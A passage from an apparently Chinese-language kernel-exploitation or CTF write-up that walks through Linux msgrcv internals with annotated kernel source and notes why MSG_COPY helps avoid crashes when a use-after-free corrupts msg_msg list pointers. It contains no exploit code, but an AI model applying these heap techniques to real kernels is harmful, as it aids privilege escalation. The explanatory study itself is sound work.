<li>msgflg：0：阻塞式接收消息，没有该类型的消息msgrcv函数一直阻塞等待。IPC_NOWAIT：如果没有返回条件的消息调用立即返回，此时错误码为ENOMSG。IPC_EXCEPT：与msgtyp配合使用返回队列中第一个类型不为msgtyp的消息。IPC_NOERROR：如果队列中满足条件的消息内容大于所请求的size字节，则把消息截断，截断的部分被丢弃</li>
</ul>
<p>这两个syscall主要用于发送messgae到系统的消息队列，然后从消息队列接收message。调用他的进程必须对消息队列有写权限才能发送消息，有读权限才能接收消息。</p>
<h3 id="msgrcv-shu-ju-jie-shou">msgrcv()数据接收</h3><p>总体流程：<code>msgrcv() -&gt; ksys_msgrcv() -&gt; do_msgrcv() -&gt; find_msg() &amp; do_msg_fill() &amp; free_msg()</code>。调用<code>find_msg()</code>来定位正确的消息，将消息从队列中unlink，再调用 <code>do_msg_fill() -&gt; store_msg()</code> 来将内核数据拷贝到用户空间，最后调用 free_msg() 释放消息</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">SYSCALL_DEFINE5</span><span style="color:#c0c5ce;">(msgrcv, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, msqid, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msgbuf __user *, msgp, size_t, msgsz,
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">, msgtyp, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">, msgflg)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">ksys_msgrcv</span><span style="color:#c0c5ce;">(msqid, msgp, msgsz, msgtyp, msgflg);
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">long </span><span style="color:#8fa1b3;">ksys_msgrcv</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">msqid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msgbuf __user *</span><span style="color:#bf616a;">msgp</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">msgsz</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		 </span><span style="color:#b48ead;">long </span><span style="color:#bf616a;">msgtyp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">msgflg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">do_msgrcv</span><span style="color:#c0c5ce;">(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">do_msgrcv</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">msqid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">bufsz</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">long </span><span style="color:#bf616a;">msgtyp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">msgflg</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	       </span><span style="color:#b48ead;">long </span><span style="color:#c0c5ce;">(*msg_handler)(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *, size_t))
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// msg_handler参数实际指向do_msg_fill()参数
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> mode;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_queue *msq;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ipc_namespace *ns;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *msg, *copy = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">DEFINE_WAKE_Q</span><span style="color:#c0c5ce;">(wake_q);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	ns = current-&gt;nsproxy-&gt;ipc_ns;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msqid &lt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">|| (</span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">) bufsz &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 若设置了MSG_COPY位
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 调用prepare_copy预先分配
</span><span style="color:#c0c5ce;">   	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msgflg &amp; MSG_COPY) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
</span><span style="color:#c0c5ce;">         </span><span style="color:#65737e;">// prepare_copy事实上会申请bufsz大小内存，将buf内容拷贝进去
</span><span style="color:#c0c5ce;">		copy = </span><span style="color:#8fa1b3;">prepare_copy</span><span style="color:#c0c5ce;">(buf, </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(size_t, bufsz, ns-&gt;msg_ctlmax));
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">IS_ERR</span><span style="color:#c0c5ce;">(copy))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">PTR_ERR</span><span style="color:#c0c5ce;">(copy);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	mode = </span><span style="color:#8fa1b3;">convert_mode</span><span style="color:#c0c5ce;">(&amp;msgtyp, msgflg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	msq = </span><span style="color:#8fa1b3;">msq_obtain_object_check</span><span style="color:#c0c5ce;">(ns, msqid);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">IS_ERR</span><span style="color:#c0c5ce;">(msq)) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">free_copy</span><span style="color:#c0c5ce;">(copy);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">PTR_ERR</span><span style="color:#c0c5ce;">(msq);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(;;) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_receiver msr_d;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		msg = </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-EACCES);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ipcperms</span><span style="color:#c0c5ce;">(ns, &amp;msq-&gt;q_perm, S_IRUGO))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock1;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ipc_lock_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* raced with RMID? */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">ipc_valid_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm)) {
</span><span style="color:#c0c5ce;">			msg = </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-EIDRM);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">// 调用find_msg()定位正确的消息
</span><span style="color:#c0c5ce;">		msg = </span><span style="color:#8fa1b3;">find_msg</span><span style="color:#c0c5ce;">(msq, &amp;msgtyp, mode);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">IS_ERR</span><span style="color:#c0c5ce;">(msg)) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">			 * Found a suitable message.
</span><span style="color:#65737e;">			 * Unlink it from the queue.
</span><span style="color:#65737e;">			 */
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) {
</span><span style="color:#c0c5ce;">				msg = </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-E2BIG);
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">			 * If we are copying, then do not unlink message and do
</span><span style="color:#65737e;">			 * not update queue parameters.
</span><span style="color:#65737e;">			 */
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">// 如果设置MSG_COPY，跳出循环，避免unlink
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msgflg &amp; MSG_COPY) {
</span><span style="color:#c0c5ce;">				msg = </span><span style="color:#8fa1b3;">copy_msg</span><span style="color:#c0c5ce;">(msg, copy);
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">			}
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">// 将消息unlink
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">list_del</span><span style="color:#c0c5ce;">(&amp;msg-&gt;m_list);
</span><span style="color:#c0c5ce;">			msq-&gt;q_qnum--;
</span><span style="color:#c0c5ce;">			msq-&gt;q_rtime = </span><span style="color:#8fa1b3;">ktime_get_real_seconds</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">ipc_update_pid</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_lrpid, </span><span style="color:#8fa1b3;">task_tgid</span><span style="color:#c0c5ce;">(current));
</span><span style="color:#c0c5ce;">			msq-&gt;q_cbytes -= msg-&gt;m_ts;
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">atomic_sub</span><span style="color:#c0c5ce;">(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">atomic_dec</span><span style="color:#c0c5ce;">(&amp;ns-&gt;msg_hdrs);
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">ss_wakeup</span><span style="color:#c0c5ce;">(msq, &amp;wake_q, </span><span style="color:#d08770;">false</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* No message waiting. Wait for a message */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msgflg &amp; IPC_NOWAIT) {
</span><span style="color:#c0c5ce;">			msg = </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-ENOMSG);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">list_add_tail</span><span style="color:#c0c5ce;">(&amp;msr_d.</span><span style="color:#bf616a;">r_list</span><span style="color:#c0c5ce;">, &amp;msq-&gt;q_receivers);
</span><span style="color:#c0c5ce;">		msr_d.</span><span style="color:#bf616a;">r_tsk </span><span style="color:#c0c5ce;">= current;
</span><span style="color:#c0c5ce;">		msr_d.</span><span style="color:#bf616a;">r_msgtype </span><span style="color:#c0c5ce;">= msgtyp;
</span><span style="color:#c0c5ce;">		msr_d.</span><span style="color:#bf616a;">r_mode </span><span style="color:#c0c5ce;">= mode;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msgflg &amp; MSG_NOERROR)
</span><span style="color:#c0c5ce;">			msr_d.</span><span style="color:#bf616a;">r_maxsize </span><span style="color:#c0c5ce;">= INT_MAX;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">			msr_d.</span><span style="color:#bf616a;">r_maxsize </span><span style="color:#c0c5ce;">= bufsz;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* memory barrier not require due to ipc_lock_object() */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">WRITE_ONCE</span><span style="color:#c0c5ce;">(msr_d.</span><span style="color:#bf616a;">r_msg</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-EAGAIN));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* memory barrier not required, we own ipc_lock_object() */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">__set_current_state</span><span style="color:#c0c5ce;">(TASK_INTERRUPTIBLE);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ipc_unlock_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm);
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">schedule</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">		 * Lockless receive, part 1:
</span><span style="color:#65737e;">		 * We don&#39;t hold a reference to the queue and getting a
</span><span style="color:#65737e;">		 * reference would defeat the idea of a lockless operation,
</span><span style="color:#65737e;">		 * thus the code relies on rcu to guarantee the existence of
</span><span style="color:#65737e;">		 * msq:
</span><span style="color:#65737e;">		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.
</span><span style="color:#65737e;">		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">rcu_read_lock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">		 * Lockless receive, part 2:
</span><span style="color:#65737e;">		 * The work in pipelined_send() and expunge_all():
</span><span style="color:#65737e;">		 * - Set pointer to message
</span><span style="color:#65737e;">		 * - Queue the receiver task for later wakeup
</span><span style="color:#65737e;">		 * - Wake up the process after the lock is dropped.
</span><span style="color:#65737e;">		 *
</span><span style="color:#65737e;">		 * Should the process wake up before this wakeup (due to a
</span><span style="color:#65737e;">		 * signal) it will either see the message and continue ...
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		msg = </span><span style="color:#8fa1b3;">READ_ONCE</span><span style="color:#c0c5ce;">(msr_d.</span><span style="color:#bf616a;">r_msg</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msg != </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-EAGAIN)) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* see MSG_BARRIER for purpose/pairing */
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">smp_acquire__after_ctrl_dep</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock1;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		 </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">		  * ... or see -EAGAIN, acquire the lock to check the message
</span><span style="color:#65737e;">		  * again.
</span><span style="color:#65737e;">		  */
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ipc_lock_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		msg = </span><span style="color:#8fa1b3;">READ_ONCE</span><span style="color:#c0c5ce;">(msr_d.</span><span style="color:#bf616a;">r_msg</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(msg != </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-EAGAIN))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">list_del</span><span style="color:#c0c5ce;">(&amp;msr_d.</span><span style="color:#bf616a;">r_list</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">signal_pending</span><span style="color:#c0c5ce;">(current)) {
</span><span style="color:#c0c5ce;">			msg = </span><span style="color:#8fa1b3;">ERR_PTR</span><span style="color:#c0c5ce;">(-ERESTARTNOHAND);
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out_unlock0;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">ipc_unlock_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">out_unlock0:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ipc_unlock_object</span><span style="color:#c0c5ce;">(&amp;msq-&gt;q_perm);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">wake_up_q</span><span style="color:#c0c5ce;">(&amp;wake_q);
</span><span style="color:#c0c5ce;">out_unlock1:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">rcu_read_unlock</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">IS_ERR</span><span style="color:#c0c5ce;">(msg)) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">free_copy</span><span style="color:#c0c5ce;">(copy);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">PTR_ERR</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 调用do_msg_fill()，把消息从内核拷贝到用户
</span><span style="color:#c0c5ce;">	bufsz = </span><span style="color:#8fa1b3;">msg_handler</span><span style="color:#c0c5ce;">(buf, msg, bufsz);
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 拷贝完成后，释放消息
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">free_msg</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> bufsz;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="xiao-xi-kao-bei">消息拷贝</h3><p><code>do_msg_fill() -&gt; store_msg()</code>
和创建消息的过程一样，先拷贝消息头（msg_msg结构对应的数据），再拷贝segment（msg_msgseg结构对应的数据）</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">do_msg_fill</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">dest</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">bufsz</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msgbuf __user *msgp = dest;
</span><span style="color:#c0c5ce;">	size_t msgsz;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">put_user</span><span style="color:#c0c5ce;">(msg-&gt;m_type, &amp;msgp-&gt;mtype))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">	
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 检查请求的数据长度是否大于msg-&gt;m_ts
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 超过则只能获取msg-&gt;m_ts长度的数据（避免越界读）
</span><span style="color:#c0c5ce;">	msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 调用store_msg()将msgsz大小拷贝到用户空间
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">store_msg</span><span style="color:#c0c5ce;">(msgp-&gt;mtext, msg, msgsz))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EFAULT;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> msgsz;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">store_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">dest</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	size_t alen;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg *seg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 获取第一部分长度
</span><span style="color:#c0c5ce;">	alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_MSG);
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 拷贝消息，跳过消息头
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_to_user</span><span style="color:#c0c5ce;">(dest, msg + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, alen))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 如果有msg_msgseg，则紧跟着dest+alen放置
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(seg = msg-&gt;next; seg != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">; seg = seg-&gt;next) {
</span><span style="color:#c0c5ce;">		len -= alen;
</span><span style="color:#c0c5ce;">		dest = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> __user *)dest + alen;
</span><span style="color:#c0c5ce;">		alen = </span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(len, DATALEN_SEG);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_to_user</span><span style="color:#c0c5ce;">(dest, seg + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, alen))
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="xiao-xi-shi-fang">消息释放</h3><p>先释放消息头，再释放segment</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">free_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msg *</span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg *seg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">security_msg_msg_free</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	seg = msg-&gt;next;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">// 释放消息头
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(msg);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(seg != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> msg_msgseg *tmp = seg-&gt;next;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">cond_resched</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">// 遍历释放segment
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(seg);
</span><span style="color:#c0c5ce;">		seg = tmp;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><strong>MSG_COPY</strong>见 <code>do_msgrcv()</code> 中17行处，如果用flag <code>MSG_COPY</code>来调用 <code>msgrcv()</code> （内核编译时需配置CONFIG_CHECKPOINT_RESTORE选项，默认已配置），就会调用 <code>prepare_copy()</code> 分配临时消息，并调用 <code>copy_msg()</code> 将请求的数据拷贝到该临时消息（见 <code>do_msgrcv()</code> 中20行处）。在将消息拷贝到用户空间之后，原始消息会被保留，不会从队列中unlink，然后调用free_msg()删除该临时消息，这对于利用很重要。</p>
<p>为什么？因为在第一次UAF的时候，没有泄露正确地址，所以会破坏msg_msg-&gt;m_list双链表指针，unlink会触发崩溃。本题的UAF会破坏前16字节，如果某漏洞可以跳过前16字节，是否不需要注意这一点？</p>
